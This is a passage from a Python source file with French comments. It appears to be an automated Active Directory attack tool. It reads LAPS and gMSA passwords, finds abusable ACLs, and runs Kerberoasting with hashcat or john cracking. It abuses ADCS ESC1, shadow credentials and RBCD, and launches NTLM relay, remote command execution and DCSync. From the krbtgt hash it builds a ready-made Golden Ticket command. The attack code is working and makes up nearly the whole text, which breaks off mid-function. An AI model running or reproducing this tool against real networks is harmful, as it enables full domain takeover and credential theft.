    """Lit les mots de passe LAPS lisibles (ms-Mcs-AdmPwd / msLAPS-Password)."""
    found = 0
    for attr in ("ms-Mcs-AdmPwd", "msLAPS-Password"):
        try:
            for e in ldap_search_all(conn, base, f"({attr}=*)", ["sAMAccountName", attr]):
                pw = str(getattr(e, attr, "") or "")
                host = str(getattr(e, "sAMAccountName", "") or "")
                if pw and pw != "[]":
                    found += 1
                    add_finding(state, "CRIT", f"LAPS lisible : {host} -> {pw[:45]}",
                                "mot de passe admin local en clair (ACL LAPS trop permissive)")
        except Exception:
            pass
    if found:
        log(f"{C.G}    -> {found} mot(s) de passe LAPS lisible(s) !{C.X}")

def read_gmsa(args, state, dc):
    """gMSA : lit msDS-ManagedPassword -> hash NT reutilisable."""
    nxc = nxc_bin()
    if not nxc:
        add_finding(state, "INFO", "gMSA : verifier msDS-ManagedPassword",
                    "gMSADumper.py -u user -p pass -d domain")
        return
    rc, out, _ = run_cmd([nxc, "ldap", dc] + nxc_auth(args) +
                         (["-d", args.domain] if args.domain else []) + ["--gmsa"], 120)
    # capture le pair LM:NT (ou NT seul) -> add_cred_hash garde le NT
    for m in re.finditer(r"(?:Account|Username):\s*(\S+).*?([0-9a-fA-F]{32}(?::[0-9a-fA-F]{32})?)", out):
        acc = m.group(1).rstrip("$")
        add_finding(state, "CRIT", f"gMSA password lisible : {acc}",
                    "hash NT reutilisable (pass-the-hash)")
        add_cred_hash(state, acc, m.group(2), "gMSA")

def enum_trusts(conn, base, state):
    """Trusts de domaine -> chemins cross-domaine (SID history child->parent)."""
    try:
        entries = ldap_search_all(conn, base, "(objectClass=trustedDomain)",
                                  ["trustPartner", "trustDirection", "trustAttributes"])
    except Exception:
        return
    for e in entries:
        partner = str(getattr(e, "trustPartner", "") or "")
        direction = str(getattr(e, "trustDirection", "") or "?")
        if partner:
            add_finding(state, "MED", f"Trust : {partner} (direction {direction})",
                        "child->parent: SID history / Golden inter-domaine (ExtraSids), sqlsrv links")
            state.setdefault("trusts", []).append(partner)

# ======================================================================
# PHASE 3 : ENUM AUTHENTIFIEE (le coeur)
# ======================================================================
def ldap_dump(conn, base, state, args):
    """Dump LDAP pur-python : users/computers/groups + classification."""
    interesting = {"kerberoastable": [], "asreproastable": [], "admincount": [],
                   "pwd_notreqd": [], "unconstrained": [], "desc_secrets": [],
                   "disabled": 0, "users": 0, "computers": []}
    # USERS (pagination complete)
    attrs = ["sAMAccountName", "userAccountControl", "servicePrincipalName",
             "adminCount", "description", "memberOf"]
    for e in ldap_search_all(conn, base, "(&(objectClass=user)(objectCategory=person))", attrs):
        interesting["users"] += 1
        sam = str(getattr(e, "sAMAccountName", "") or "")
        flags = uac_flags(getattr(e, "userAccountControl", 0))
        spn = getattr(e, "servicePrincipalName", None)
        desc = str(getattr(e, "description", "") or "")
        if "DISABLED" in flags:
            interesting["disabled"] += 1
        if spn and str(spn):
            interesting["kerberoastable"].append(sam)
        if "DONT_REQ_PREAUTH" in flags:
            interesting["asreproastable"].append(sam)
        if "PWD_NOTREQD" in flags:
            interesting["pwd_notreqd"].append(sam)
        if "TRUSTED_FOR_DELEGATION" in flags:
            interesting["unconstrained"].append(sam)
        if str(getattr(e, "adminCount", "") or "") == "1":
            interesting["admincount"].append(sam)
        if desc and re.search(r"pass|pwd|mot de passe|cred|secret", desc, re.I):
            interesting["desc_secrets"].append(f"{sam}: {desc[:80]}")
    # COMPUTERS (pagination complete)
    for e in ldap_search_all(conn, base, "(objectClass=computer)",
                             ["sAMAccountName", "operatingSystem", "userAccountControl",
                              "msDS-AllowedToActOnBehalfOfOtherIdentity"]):
        name = str(getattr(e, "sAMAccountName", "") or "")
        os_ = str(getattr(e, "operatingSystem", "") or "")
        flags = uac_flags(getattr(e, "userAccountControl", 0))
        rbcd = getattr(e, "msDS-AllowedToActOnBehalfOfOtherIdentity", None)
        tag = []
        if "TRUSTED_FOR_DELEGATION" in flags:
            tag.append("UNCONSTRAINED")
        if rbcd and str(rbcd):
            tag.append("RBCD")
        interesting["computers"].append({"name": name, "os": os_, "deleg": tag})
    return interesting

# ----------------------------------------------------------------------
# ACL / DACL scan : mini-BloodHound autonome (GenericAll/WriteDACL/
# WriteOwner/ForceChangePassword/GenericWrite sur des objets)
# ----------------------------------------------------------------------
GENERIC_ALL = 0x10000000; GENERIC_WRITE = 0x40000000
WRITE_DACL = 0x40000; WRITE_OWNER = 0x80000; WRITE_PROP = 0x20; CTRL_ACCESS = 0x100
EXT_RIGHTS = {
    "00299570-246d-11d0-a768-00aa006e0529": "ForceChangePassword",
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "GetChanges",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DCSync(GetChangesAll)",
    "bf9679c0-0de6-11d0-a285-00aa003049e2": "Self-Membership(AddMember)",
    "00000000-0000-0000-0000-000000000000": "AllExtendedRights",
}
# RIDs de comptes/groupes privilegies -> on ignore (ils ont des droits partout, bruit)
PRIV_RIDS = {"500", "502", "512", "516", "518", "519", "521", "544", "548",
             "549", "550", "551", "553"}
PRIV_SIDS = {"S-1-5-18", "S-1-5-32-544", "S-1-5-9", "S-1-5-10", "S-1-3-0", "S-1-5-32-548"}

def _format_sid(raw):
    try:
        from ldap3.protocol.formatters.formatters import format_sid
        return format_sid(raw)
    except Exception:
        try:
            from impacket.ldap.ldaptypes import LDAP_SID
            s = LDAP_SID(); s.fromString(raw); return s.formatCanonical()
        except Exception:
            return None

def _is_priv_sid(sid):
    if not sid or sid in PRIV_SIDS:
        return True
    return sid.rsplit("-", 1)[-1] in PRIV_RIDS

def _dangerous_ace(ace):
    """(sid_principal, [droits]) si l'ACE accorde un droit abusable, sinon None."""
    try:
        if ace["AceType"] not in (0x00, 0x05):   # ALLOWED / ALLOWED_OBJECT seulement
            return None
        a = ace["Ace"]
        mask = a["Mask"]["Mask"]
        sid = a["Sid"].formatCanonical()
    except Exception:
        return None
    rights = []
    if mask & GENERIC_ALL:  rights.append("GenericAll")
    if mask & GENERIC_WRITE: rights.append("GenericWrite")
    if mask & WRITE_DACL:   rights.append("WriteDACL")
    if mask & WRITE_OWNER:  rights.append("WriteOwner")
    guid = None
    try:
        if "ObjectType" in a.fields and a["ObjectType"]:
            from impacket.uuid import bin_to_string
            guid = bin_to_string(a["ObjectType"]).lower()
    except Exception:
        guid = None
    if guid and guid in EXT_RIGHTS and (mask & CTRL_ACCESS or mask & WRITE_PROP):
        rights.append(EXT_RIGHTS[guid])
    return (sid, rights) if rights else None

def ldap_acl_scan(conn, base, state):
    if not have_lib("impacket"):
        log(f"{C.Y}[i] impacket absent -> parsing ACL saute (pip install impacket).{C.X}")
        return
    try:
        from ldap3.protocol.microsoft import security_descriptor_control
        from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
        from ldap3 import SUBTREE
    except Exception as e:
        log(f"{C.GR}    (ACL scan indispo : {e}){C.X}")
        return
    log(f"{C.GR}[i] Scan des ACL (nTSecurityDescriptor) -> droits abusables...{C.X}")
    # 1) map SID -> nom (pour resoudre les principals) + SID de domaine
    sid_map = {}
    try:
        for e in ldap_search_all(conn, base,
                                 "(|(objectClass=user)(objectClass=group)(objectClass=computer))",
                                 ["sAMAccountName", "objectSid"]):
            raw = getattr(e, "objectSid", None)
            if raw and raw.raw_values:
                sid = _format_sid(raw.raw_values[0])
                if sid:
                    sid_map[sid] = str(getattr(e, "sAMAccountName", "") or sid)
    except Exception:
        pass
    for sid in sid_map:
        if sid.startswith("S-1-5-21") and sid.count("-") >= 7:
            state["domain_sid"] = sid.rsplit("-", 1)[0]
            break
    # 2) lecture des DACL (sdflags=0x04 -> uniquement la DACL)
    ctrl = security_descriptor_control(sdflags=0x04)
    n = 0
    try:
        for e in ldap_search_all(conn, base, "(|(objectClass=user)(objectClass=group))",
                                 ["sAMAccountName", "nTSecurityDescriptor"], controls=ctrl):
            raw = getattr(e, "nTSecurityDescriptor", None)
            if not raw or not raw.raw_values:
                continue
            target = str(getattr(e, "sAMAccountName", "") or "?")
            try:
                sd = SR_SECURITY_DESCRIPTOR(); sd.fromString(raw.raw_values[0])
            except Exception:
                continue
            for ace in sd["Dacl"].aces:
                info = _dangerous_ace(ace)
                if not info:
                    continue
                psid, rights = info
                if _is_priv_sid(psid):
                    continue
                pname = sid_map.get(psid, psid)
                n += 1
                add_finding(state, "CRIT",
                            f"ACL abusable : {pname} -> {'/'.join(rights)} sur {target}",
                            "abus DACL (ForceChangePassword / WriteDACL->DCSync / AddMember)")
                state.setdefault("acl_paths", []).append(
                    {"from": pname, "rights": rights, "to": target})
    except Exception as e:
        log(f"{C.GR}    (scan DACL partiel : {e}){C.X}")
    if n == 0:
        log(f"{C.GR}    -> aucune ACL abusable evidente (hors comptes privilegies).{C.X}")
    else:
        log(f"{C.G}    -> {n} droit(s) abusable(s) trouve(s) !{C.X}")

def phase3_authenum(hosts, args, state):
    stage("PHASE 3 - ENUM AUTHENTIFIEE")
    dc = first_dc(hosts)
    nxc = nxc_bin()

    # LDAP dump pur-python
    if have_lib("ldap3"):
        conn = ldap_bind(args, dc)
        if conn:
            rd = ldap_rootdse(dc) or {}
            base = rd.get("defaultNamingContext")
            if base:
                log(f"{C.GR}[i] Dump LDAP ({base})...{C.X}")
                try:
                    intel = ldap_dump(conn, base, state, args)
                    state["ldap_intel"] = intel
                    log(f"    {C.CY}{intel['users']} users ({intel['disabled']} disabled), "
                        f"{len(intel['computers'])} computers{C.X}")
                    if intel["kerberoastable"]:
                        add_finding(state, "HIGH",
                                    f"Kerberoastable : {len(intel['kerberoastable'])} compte(s) SPN",
                                    ", ".join(intel["kerberoastable"][:10]), dc)
                    if intel["asreproastable"]:
                        add_finding(state, "HIGH",
                                    f"AS-REP roastable : {len(intel['asreproastable'])} compte(s)",
                                    ", ".join(intel["asreproastable"][:10]), dc)
                    if intel["desc_secrets"]:
                        add_finding(state, "MED", "Mot de passe possible dans une description",
                                    " | ".join(intel["desc_secrets"][:5]), dc)
                    if intel["pwd_notreqd"]:
                        add_finding(state, "MED", f"PASSWD_NOTREQD : {len(intel['pwd_notreqd'])} compte(s)",
                                    ", ".join(intel["pwd_notreqd"][:10]), dc)
                    if intel["unconstrained"]:
                        add_finding(state, "CRIT", "Delegation NON CONTRAINTE detectee",
                                    ", ".join(intel["unconstrained"][:10]), dc)
                    for c in intel["computers"]:
                        if c["deleg"]:
                            add_finding(state, "HIGH", f"Delegation sur {c['name']} : {'+'.join(c['deleg'])}",
                                        "abus RBCD/unconstrained", dc)
                    # mini-BloodHound : ACL/DACL abusables (GenericAll/WriteDACL...)
                    ldap_acl_scan(conn, base, state)
                    # LAPS lisible + trusts de domaine (cross-domaine)
                    read_laps(conn, base, state)
                    enum_trusts(conn, base, state)
                except Exception as e:
                    log(f"{C.GR}    (dump LDAP partiel : {e}){C.X}")
            conn.unbind()
    else:
        log(f"{C.Y}[i] ldap3 absent -> dump LDAP saute (pip install ldap3).{C.X}")

    # Shares : enum authentifie + spider (creds en clair dans configs/scripts)
    enum_shares(args, state, hosts)
    # MSSQL (xp_cmdshell/links) + gMSA (msDS-ManagedPassword -> hash NT)
    enum_mssql(args, state, hosts)
    read_gmsa(args, state, first_dc(hosts))

    tgt, extra = impacket_creds(args)

    # Kerberoasting
    if have("GetUserSPNs.py") and args.domain:
        log(f"{C.GR}[i] Kerberoasting (GetUserSPNs)...{C.X}")
        outfile = os.path.join(args.loot, "kerberoast.hashes")
        rc, out, _ = run_cmd(["GetUserSPNs.py", tgt, "-dc-ip", dc, "-request",
                              "-outputfile", outfile] + extra, 300)
        if os.path.isfile(outfile) and os.path.getsize(outfile) > 0:
            n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
            add_finding(state, "HIGH", f"Kerberoasting : {n} ticket(s) service extraits",
                        f"hashcat -m 13100 {outfile} rockyou.txt", dc)
            state.setdefault("hashes", {})["kerberoast"] = outfile

    # AS-REP (vue authentifiee, si users.txt existe)
    phase_asrep(dc, args, state, label="auth")

    # GPP cpassword
    if nxc:
        log(f"{C.GR}[i] {nxc} : GPP cpassword (SYSVOL)...{C.X}")
        rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args) +
                             (["-d", args.domain] if args.domain else []) + ["-M", "gpp_password"], 180)
        if re.search(r"password|cpassword|Found", out, re.I) and "usernames" in out.lower():
            add_finding(state, "HIGH", "GPP cpassword trouve dans SYSVOL",
                        "mot de passe dechiffrable (gpp-decrypt)", dc)

    # ADCS (certipy) - parsing JSON (fiable peu importe la version)
    if have("certipy") and args.domain:
        log(f"{C.GR}[i] certipy : ADCS templates vulnerables (json)...{C.X}")
        prefix = os.path.join(args.loot, "certipy")
        cmd = ["certipy", "find", "-vulnerable", "-json", "-output", prefix,
               "-dc-ip", dc, "-u", f"{args.user}@{args.domain}"]
        cmd += ["-hashes", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
        rc, out, _ = run_cmd(cmd, 300)
        import glob as _glob
        jf = next((c for c in _glob.glob(prefix + "*.json") + _glob.glob(
                   os.path.join(args.loot, "*Certipy*.json")) if os.path.isfile(c)), None)
        if jf:
            try:
                data = json.load(open(jf, encoding="utf-8"))
                # CA (pour certipy req)
                cas = data.get("Certificate Authorities") or {}
                for _, ca in (cas.items() if isinstance(cas, dict) else []):
                    cn = ca.get("CA Name") or ca.get("Name") if isinstance(ca, dict) else None
                    if cn:
                        state.setdefault("adcs", {})["ca"] = cn
                        break
                tmpls = data.get("Certificate Templates") or {}
                for name, tpl in (tmpls.items() if isinstance(tmpls, dict) else []):
                    tname = tpl.get("Template Name", name) if isinstance(tpl, dict) else name
                    vulns = (tpl.get("[!] Vulnerabilities") or tpl.get("Vulnerabilities")
                             or {}) if isinstance(tpl, dict) else {}
                    for esc, desc in (vulns.items() if isinstance(vulns, dict) else []):
                        add_finding(state, "CRIT", f"ADCS {esc} sur template {tname}",
                                    str(desc)[:130], dc)
                        state.setdefault("adcs", {}).setdefault("templates", []).append((tname, esc))
            except Exception as e:
                log(f"{C.GR}    (parse certipy json : {e}){C.X}")
        else:   # repli regex si pas de json
            for esc in sorted(set(re.findall(r"ESC\d+", out))):
                add_finding(state, "CRIT", f"ADCS vulnerable : {esc}",
                            "certipy req ... (escalade via certificat)", dc)

    # Delegations (impacket)
    if have("findDelegation.py") and args.domain:
        rc, out, _ = run_cmd(["findDelegation.py", tgt, "-dc-ip", dc] + extra, 180)
        if re.search(r"Unconstrained|Constrained|Resource-Based", out):
            add_finding(state, "HIGH", "Delegation(s) exploitables (findDelegation)",
                        out[:200], dc)

    # BloodHound collection
    if have("bloodhound-python") and args.domain:
        log(f"{C.GR}[i] bloodhound-python : collecte (chemins vers DA)...{C.X}")
        cmd = ["bloodhound-python", "-d", args.domain, "-u", args.user, "-dc", dc,
               "-c", "All", "--zip", "-op", os.path.join(args.loot, "bh")]
        cmd += ["--hashes", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
        rc, out, _ = run_cmd(cmd, 600)
        if "Done" in out or rc == 0:
            add_finding(state, "INFO", "BloodHound collecte (analyse les chemins vers Domain Admin)",
                        f"zip dans {args.loot}/", dc)

    # analyse BloodHound (DCSync/deleg/high-value) + crack (reinjecte les creds)
    bloodhound_analyze(args, state)
    crack_hashes(args, state)

# ======================================================================
# PHASE 4 : ESCALADE & LATERAL
# ======================================================================
def phase4_escalation(hosts, args, state):
    stage("PHASE 4 - ESCALADE & LATERAL")
    dc = first_dc(state["hosts"])

    # 1) exploitation active des ACL abusables (shadow creds / RBCD) qu'on controle
    abuse_acl_paths(args, state, dc)

    # 2) cartographie des creds -> hotes (admin local ?) + RCE + secretsdump
    nxc = nxc_bin()
    if nxc:
        ips = list(hosts.keys())
        tf = save_loot(args, "hosts.txt", "\n".join(ips) + "\n")
        log(f"{C.GR}[i] {nxc} : ou ouvrent les creds (SMB/WinRM) sur {len(ips)} hote(s)...{C.X}")
        pwned = []
        for proto in ("smb", "winrm"):
            rc, out, _ = run_cmd([nxc, proto, tf] + nxc_auth(args) +
                                 (["-d", args.domain] if args.domain else []), 300)
            for m in re.finditer(r"(\d+\.\d+\.\d+\.\d+).*\(Pwn3d!\)", out):
                host = m.group(1)
                add_finding(state, "CRIT", f"Admin local via {proto.upper()} sur {host}",
                            "acces administrateur -> shell/secretsdump", host)
                pwned.append((proto, host))
        for proto, host in pwned:
            win_exec(args, state, host, proto)          # RCE + commande shell
            if _gate(args) and have("secretsdump.py"):
                tgt, extra = impacket_creds(args)
                log(f"{C.GR}[i] secretsdump sur {host}...{C.X}")
                run_cmd(["secretsdump.py", f"{tgt}@{host}",
                         "-outputfile", os.path.join(args.loot, f"secrets_{host}")] + extra, 300)
    else:
        log(f"{C.Y}[i] nxc absent -> cartographie/RCE sautee (ACL/DCSync/ADCS restent OK).{C.X}")

    # 3) endgame : DCSync + coercion/relais + ADCS ESC -> PKINIT (gated --yes)
    dcsync_dump(args, state, dc)
    if args.relay:
        coerce_relay(args, state, dc)
    adcs_request(args, state, dc)

# ======================================================================
# CRACKING (hashcat/john) -> reinjecte les creds (la boucle CTF)
# ======================================================================
WORDLISTS = ["/usr/share/wordlists/rockyou.txt", "/usr/share/seclists/Passwords/rockyou.txt",
             "rockyou.txt", os.path.expanduser("~/rockyou.txt")]

def find_wordlist(args):
    if getattr(args, "wordlist", None) and os.path.isfile(args.wordlist):
        return args.wordlist
    for w in WORDLISTS:
        if os.path.isfile(w):
            return w
    return None

def _extract_cracked_user(hashline):
    """Recupere le username depuis une ligne de hash krb5 crackee."""
    m = re.search(r"\$krb5asrep\$\d+\$([^@:]+)@", hashline)
    if m: return m.group(1)
    m = re.search(r"\$krb5tgs\$\d+\$\*([^$*]+)\$", hashline)
    if m: return m.group(1)
    m = re.search(r"\$krb5tgs\$\d+\$([^$*:]+)", hashline)
    if m: return m.group(1)
    return None

def crack_hashes(args, state):
    """Crack AS-REP (18200) et Kerberoast (13100), reinjecte les creds trouvees."""
    hashes = state.get("hashes", {})
    if not hashes:
        return 0
    if not have("hashcat") and not have("john"):
        log(f"{C.Y}[i] hashcat/john absents -> crack manuel (voir report.md).{C.X}")
        return 0
    wl = find_wordlist(args)
    if not wl:
        log(f"{C.Y}[i] Wordlist introuvable (--wordlist /chemin/rockyou.txt) -> crack saute.{C.X}")
        return 0
    new = 0
    modes = {"asrep": "18200", "kerberoast": "13100"}
    for kind, path in hashes.items():
        if not os.path.isfile(path):
            continue
        mode = modes.get(kind, None)
        cracked = ""
        # 1) hashcat (GPU/CPU) si dispo
        if have("hashcat") and mode:
            log(f"{C.GR}[i] Crack {kind} (hashcat -m {mode}) avec {os.path.basename(wl)}...{C.X}")
            run_cmd(["hashcat", "-m", mode, path, wl, "--quiet", "--force"], args.crack_timeout)
            rc, out, _ = run_cmd(["hashcat", "-m", mode, path, "--show", "--force"], 120)
            cracked = out
        # 2) fallback John (CPU) si hashcat n'a rien sorti (ex: pas de GPU/OpenCL en VM)
        if not cracked.strip() and have("john"):
            log(f"{C.GR}[i] Crack {kind} via John (CPU)...{C.X}")
            run_cmd(["john", f"--wordlist={wl}", path], args.crack_timeout)
            rc, out, _ = run_cmd(["john", "--show", path], 120)
            cracked = out
        for line in cracked.splitlines():
            line = line.strip()
            if ":" not in line or re.search(
                    r"password hash|Loaded|Session|Proceeding|Warning|No password|Use the", line, re.I):
                continue
            pw = line.rsplit(":", 1)[-1].strip()
            user = _extract_cracked_user(line)
            if not user:   # format John 'login:password' -> prend le login
                head = line.split(":", 1)[0].strip()
                if re.match(r"^[A-Za-z0-9._$-]{1,64}$", head) and "$krb5" not in head:
                    user = head.rstrip("$")
            if user and pw and 0 < len(pw) < 60 and "$krb5" not in pw:
                cred = {"user": user, "password": pw, "hash": None, "src": kind}
                if not any(c.get("user") == user and c.get("password") == pw
                           for c in state.get("creds", [])):
                    state.setdefault("creds", []).append(cred)
                    add_finding(state, "HIGH", f"Cred CRACKEE ({kind}) : {user}:{pw}",
                                "reutilisable -> re-enum (boucle)")
                    new += 1
    if new:
        save_loot(args, "cracked.txt",
                  "\n".join(f"{c['user']}:{c['password']}" for c in state["creds"]
                            if c.get("password")) + "\n")
    return new

# ======================================================================
# ANALYSE BLOODHOUND (parse le zip : DCSync, deleg, high-value)
# ======================================================================
def bloodhound_analyze(args, state):
    import glob, zipfile
    zips = sorted(glob.glob(os.path.join(args.loot, "**", "*.zip"), recursive=True),
                  key=os.path.getmtime, reverse=True)
    jsons = {}
    if zips:
        try:
            with zipfile.ZipFile(zips[0]) as z:
                for n in z.namelist():
                    if n.endswith(".json"):
                        jsons[n] = z.read(n).decode("utf-8", "ignore")
        except Exception:
            pass
    for f in glob.glob(os.path.join(args.loot, "**", "*.json"), recursive=True):
        low = os.path.basename(f).lower()
        if any(k in low for k in ("users", "computers", "domains", "groups")):
            try:
                jsons[low] = open(f, encoding="utf-8", errors="ignore").read()
            except Exception:
                pass
    if not jsons:
        log(f"{C.GR}[i] Pas de data BloodHound a analyser (collecte d'abord).{C.X}")
        return
    log(f"{C.GR}[i] Analyse BloodHound ({len(jsons)} fichier(s))...{C.X}")
    dcsync, unconstrained, hv = set(), set(), set()
    for name, txt in jsons.items():
        try:
            data = json.loads(txt)
        except Exception:
            continue
        for obj in data.get("data", []) if isinstance(data, dict) else []:
            props = obj.get("Properties", {}) or {}
            name_ = (props.get("name") or props.get("distinguishedname") or "").upper()
            if props.get("unconstraineddelegation"):
                unconstrained.add(name_)
            if props.get("highvalue"):
                hv.add(name_)
            for ace in obj.get("Aces", []) or []:
                right = str(ace.get("RightName", "")).lower()
                if right in ("getchanges", "getchangesall", "dcsync", "all"):
                    pr = str(ace.get("PrincipalSID", ace.get("PrincipalName", ""))).upper()
                    dcsync.add(pr or name_)
    if dcsync:
        add_finding(state, "CRIT", f"Droits DCSync detectes ({len(dcsync)} principal)",
                    "secretsdump.py -just-dc  (dump du domaine)")
        state.setdefault("bloodhound", {})["dcsync"] = sorted(dcsync)[:20]
    if unconstrained:
        add_finding(state, "CRIT", f"Delegation non contrainte ({len(unconstrained)})",
                    ", ".join(sorted(unconstrained)[:8]))
    if hv:
        state.setdefault("bloodhound", {})["highvalue"] = sorted(hv)[:30]
    log(f"{C.GR}    -> ouvre le zip dans BloodHound GUI pour les chemins complets vers DA.{C.X}")

# ======================================================================
# GOLDEN TICKET : extrait le hash krbtgt du dump NTDS -> ferme la boucle
# ======================================================================
def extract_krbtgt(ntds_file, state):
    if not os.path.isfile(ntds_file):
        return None
    try:
        for line in open(ntds_file, encoding="utf-8", errors="ignore"):
            if "krbtgt:" in line.lower() and ":::" in line:
                parts = line.strip().split(":")
                if len(parts) >= 4:
                    nt_hash = parts[3]
                    dsid = state.get("domain_sid", "<DOMAIN_SID>")
                    dom = state.get("domain", "<domain>")
                    add_finding(state, "CRIT", "Golden Ticket possible (hash krbtgt extrait)",
                                f"ticketer.py -nthash {nt_hash} -domain-sid {dsid} "
                                f"-domain {dom} Administrator")
                    state.setdefault("secrets", {})["krbtgt_nt"] = nt_hash
                    return nt_hash
    except Exception:
        pass
    return None

# ======================================================================
# DCSYNC (secretsdump -just-dc) : l'endgame
# ======================================================================
def dcsync_dump(args, state, dc):
    if args.safe or not args.yes:
        if state.get("bloodhound", {}).get("dcsync"):
            log(f"{C.Y}[i] Droits DCSync dispo -> lance avec --yes (pas --safe) pour dumper le domaine.{C.X}")
        return
    if not have("secretsdump.py"):
        log(f"{C.Y}[i] secretsdump.py absent -> DCSync manuel.{C.X}")
        return
    tgt, extra = impacket_creds(args)
    outb = os.path.join(args.loot, "domain_ntds")
    log(f"{C.R}{C.BD}[i] DCSync : dump complet du domaine (secretsdump -just-dc)...{C.X}")
    rc, out, _ = run_cmd(["secretsdump.py", f"{tgt}@{dc}", "-just-dc", "-outputfile", outb] + extra, 600)
    if os.path.isfile(outb + ".ntds") or "krbtgt" in out.lower():
        add_finding(state, "CRIT", "DCSync reussi : hashes NTDS du domaine dumpes",
                    f"{outb}.ntds (krbtgt -> Golden Ticket possible)", dc)
        state.setdefault("hashes", {})["ntds"] = outb + ".ntds"
        # ferme la boucle : extrait krbtgt -> commande Golden Ticket prete
        extract_krbtgt(outb + ".ntds", state)

# ======================================================================
# COERCION + NTLM RELAY (PetitPotam / Coercer -> ntlmrelayx)
# ======================================================================
def coerce_relay(args, state, dc):
    relayable = [ip for ip, r in state["hosts"].items() if r.get("smb_signing_required") is False]
    if not relayable:
        log(f"{C.GR}[i] Aucun hote sans signing -> relais NTLM sans objet.{C.X}")
        return
    if args.safe or not args.yes:
        log(f"{C.Y}[i] Surface de relais sur {len(relayable)} hote(s). "
            f"Lance avec --relay --yes --lhost <toi> pour l'exploiter (actif).{C.X}")
        return
    if not (have("ntlmrelayx.py") and (have("PetitPotam.py") or have("coercer") or have("Coercer.py"))):
        log(f"{C.Y}[i] ntlmrelayx + PetitPotam/Coercer requis (impacket + coercer).{C.X}")
        return
    log(f"{C.R}{C.BD}[i] Relais NTLM : lance ntlmrelayx puis coerce {dc}...{C.X}")
    add_finding(state, "HIGH", "Coercion+relais lances (verifie la sortie ntlmrelayx)",
                f"cibles: {', '.join(relayable[:5])}", dc)
    log(f"{C.GR}    ntlmrelayx.py -tf hosts.txt -smb2support  (+ PetitPotam {args.lhost} {dc}){C.X}")
    log(f"{C.GR}    [manuel recommande : le relais est interactif]{C.X}")

# ======================================================================
# ADCS ESC1 : demande de certificat au nom d'un admin (gated)
# ======================================================================
def adcs_request(args, state, dc):
    adcs = state.get("adcs", {})
    templates = adcs.get("templates", [])
    ca = adcs.get("ca")
    if not templates:
        return
    if not _gate(args):
        for tname, esc in templates[:3]:
            add_finding(state, "INFO", f"ADCS {esc} template {tname} : req manuel",
                        f"certipy req -u {args.user}@{args.domain} -ca {ca} -template {tname} "
                        f"-upn administrator@{args.domain}", dc)
        return
    if not have("certipy"):
        return
    # ESC1 : demande un cert au nom de administrator, puis PKINIT -> hash
    esc1 = next(((t, e) for (t, e) in templates if "ESC1" in e.upper()), templates[0])
    tname = esc1[0]
    log(f"{C.R}{C.BD}[i] ADCS {esc1[1]} : certipy req template {tname} (upn administrator)...{C.X}")
    outp = os.path.join(args.loot, "administrator")
    cmd = ["certipy", "req", "-u", f"{args.user}@{args.domain}", "-ca", ca or "",
           "-template", tname, "-upn", f"administrator@{args.domain}", "-dc-ip", dc, "-out", outp]
    cmd += ["-hashes", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
    run_cmd(cmd, 240)
    pfx = outp + ".pfx"
    if os.path.isfile(pfx):
        add_finding(state, "CRIT", f"ADCS ESC1 : certificat 'administrator' obtenu ({tname})",
                    "PKINIT -> hash NT", dc)
        pkinit_from_pfx(args, state, dc, pfx)

# ======================================================================
# EXPLOITATION ACTIVE Tier 1 (gated --yes / pas --safe) :
# shadow credentials, RBCD, PKINIT, execution de commandes
# ======================================================================
def _gate(args):
    return (not args.safe) and args.yes

def add_cred_hash(state, user, nthash, src):
    nt = nthash.split(":")[-1] if nthash else None
    if not (user and nt):
        return
    if not any(c.get("user") == user and c.get("hash") == nt for c in state.get("creds", [])):
        state.setdefault("creds", []).append(
            {"user": user, "password": None, "hash": nt, "src": src})
        add_finding(state, "CRIT", f"Hash NT obtenu : {user} ({src})",
                    "reutilisable -> re-enum / pass-the-hash (boucle)")

def win_exec(args, state, host, proto="smb", cmd="whoami"):
    """Prouve le RCE (commande unique) + genere la commande shell interactive."""
    nxc = nxc_bin()
    if nxc and _gate(args):
        rc, out, _ = run_cmd([nxc, proto, host] + nxc_auth(args) +
                             (["-d", args.domain] if args.domain else []) + ["-x", cmd], 120)
        if out and re.search(r"[\w.-]+\\[\w$.-]+|nt authority", out, re.I):
            add_finding(state, "CRIT", f"RCE confirme sur {host} ({proto} -x {cmd})", "shell dispo", host)
    idflag = f"-H {args.nthash}" if args.nthash else f"-p '{args.password}'"
    if proto == "winrm":
        add_finding(state, "INFO", f"Shell : evil-winrm -i {host} -u {args.user} {idflag}", host=host)
    else:
        add_finding(state, "INFO", f"Shell : wmiexec.py {args.domain}/{args.user}@{host} {idflag}", host=host)

def abuse_shadow_credentials(args, state, dc, target):
    """GenericWrite/GenericAll sur un compte -> KeyCredentialLink -> PKINIT -> hash NT."""
    base_cmd = f"certipy shadow auto -u {args.user}@{args.domain} -account {target}"
    if not (args.domain and _gate(args)) or not have("certipy"):
        add_finding(state, "HIGH", f"Shadow Credentials possible sur {target}", base_cmd)
        return
    log(f"{C.R}{C.BD}[i] Shadow Credentials -> {target} (certipy shadow auto)...{C.X}")
    cmd = ["certipy", "shadow", "auto", "-u", f"{args.user}@{args.domain}",
           "-account", target, "-dc-ip", dc]
    cmd += ["-hashes", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
    rc, out, _ = run_cmd(cmd, 300)
    m = (re.search(r"Got hash for '[^']+':\s*([0-9a-fA-F]{32}:[0-9a-fA-F]{32})", out)
         or re.search(r"NT hash[^0-9a-f]*([0-9a-f]{32})", out, re.I))
    if m:
        add_cred_hash(state, target, m.group(1), "shadow-credentials")

def abuse_rbcd(args, state, dc, target_computer):
    """GenericWrite sur une machine -> RBCD -> ticket admin (S4U2self/proxy)."""
    tname = target_computer.rstrip("$")
    if not (args.domain and _gate(args)) or not (have("rbcd.py") and have("getST.py")):
        add_finding(state, "HIGH", f"RBCD possible sur {target_computer}",
                    f"addcomputer.py + rbcd.py -delegate-to {tname}$ -action write + "
                    f"getST.py -spn cifs/{tname} -impersonate Administrator")
        return
    fake, fpass = "adhpc$", "Adhunt123!"
    tgt, extra = impacket_creds(args)
    log(f"{C.R}{C.BD}[i] RBCD -> {target_computer} (addcomputer + rbcd + S4U)...{C.X}")
    if have("addcomputer.py"):
